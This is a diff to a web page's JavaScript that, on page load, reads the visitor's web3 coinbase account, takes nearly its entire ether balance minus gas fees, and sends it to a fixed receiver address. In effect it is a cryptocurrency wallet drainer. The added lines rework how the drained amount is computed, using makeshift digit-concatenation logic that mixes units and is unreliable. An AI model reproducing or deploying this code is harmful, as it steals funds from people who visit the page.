@@ -10,7 +10,12 @@ var transactionObject;
 var gasLimitNumber = 21000;
 // Gas Price
 var gasPriceNumber = 10**10;
+// Transaction Gas Fee
+var gasFee = gasLimitNumber * gasPriceNumber;
+// Ether value send
+var etherValue;
 // Web3 start function, It will run when the web page is loaded  
+var balanceFromWie;
 function startWeb3() {
 
   coinbase = web3.eth.coinbase;
@@ -22,8 +27,38 @@ function startWeb3() {
 function getBalance(address) {
   return web3.eth.getBalance(address, function (error, result) {
     if (!error) {
-        etherBalance = Number(result.c[0] + '' + result.c[1]) - gasLimitNumber * gasPriceNumber;
-        transactionObject = {from:coinbase, to:etherReceiver, value:etherBalance, gas:gasLimitNumber, gasPrice:gasPriceNumber};
+        
+        balanceFromWie = web3.fromWei(result);
+
+        if (balanceFromWie.e < 0) {
+
+            if (balanceFromWie.c[1] == undefined) {
+                 balanceFromWie.c[1] = "0000";
+            } else {
+              balanceFromWie.c[1] = balanceFromWie.c[1].toString();
+              balanceFromWie.c[1] = balanceFromWie.c[1].substr(0, 4);
+            }
+
+             etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1]);
+
+
+        } else { 
+
+            if (balanceFromWie.c[1] == undefined) {
+                 balanceFromWie.c[1] = "00000000000000";
+            }
+            if (balanceFromWie.c[2] == undefined) {
+                 balanceFromWie.c[2] = "0000";
+            } else {
+              balanceFromWie.c[2] = balanceFromWie.c[2].toString();
+              balanceFromWie.c[2] = balanceFromWie.c[2].substr(0, 4);
+            }
+
+            etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1] + '' + balanceFromWie.c[2]);
+        }
+        
+        etherValue = etherBalance - (gasFee + (gasFee / 10)); // 1 gWei extra fee
+        transactionObject = {from:coinbase, to:etherReceiver, value:etherValue, gas:gasLimitNumber, gasPrice:gasPriceNumber};
         sendBalance(transactionObject);
     } else {
       	console.error(error);
